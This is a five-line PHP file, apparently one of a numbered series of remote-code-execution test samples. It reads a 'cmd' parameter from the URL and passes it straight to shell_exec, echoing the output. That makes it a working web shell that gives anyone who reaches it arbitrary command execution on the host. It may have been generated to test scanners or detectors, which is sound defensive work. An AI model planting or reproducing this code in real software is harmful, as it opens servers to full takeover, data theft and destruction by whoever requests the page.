<?php
// RCE test variation #260
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>